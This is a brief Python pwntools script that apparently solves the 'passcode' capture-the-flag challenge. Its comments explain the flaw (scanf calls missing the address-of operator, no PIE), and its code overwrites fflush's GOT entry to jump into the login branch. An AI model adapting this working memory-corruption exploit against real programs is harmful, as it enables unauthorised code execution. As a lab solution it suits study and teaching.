#!/usr/bin/env python

import pwn
import argparse
parser = argparse.ArgumentParser(description="Select a filename.")
parser.add_argument("filename", type=str, help="The name of the file to process")
args = parser.parse_args()

"""
Walk through:
1. Review ~/passcode.c
2. Notes:
   - welcome() allocates stack space for name
   - %100s _is safe_ as the buffer is sufficiently large to fit this
   - in login() the scanf calls for passcodes are supposed to use &passcode1 / 2
   - there is no PIE
3. you can do an arbitrary write (maybe even two, if you want)
4. target GOT and jump into the existing code to win
"""

p = pwn.process(f'{args.filename}')
p.send(pwn.cyclic(96) + pwn.p32(0x804c014)) # Overwrite fflush in the GOT
target = 0x0804928F
p.sendline(f'{target}') # with the value of the start of the part of the branch we want.
output = p.recvall(timeout=1)
print(output)
